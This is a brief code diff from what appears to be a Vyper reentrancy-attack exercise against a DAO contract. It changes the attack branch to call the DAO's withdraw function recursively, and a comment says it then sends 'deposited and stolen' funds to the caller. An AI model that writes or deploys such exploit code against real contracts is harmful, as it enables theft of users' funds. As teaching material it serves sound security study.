@@ -41,7 +41,7 @@ def attack(dao_address:address):
     # TODO: Start the reentrance attack
     if(self.is_attack == True):
         #_attack = false
-        self._attack()
+        DAO(dao_address).withdraw()
 
     # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
     send(msg.sender, self.balance)
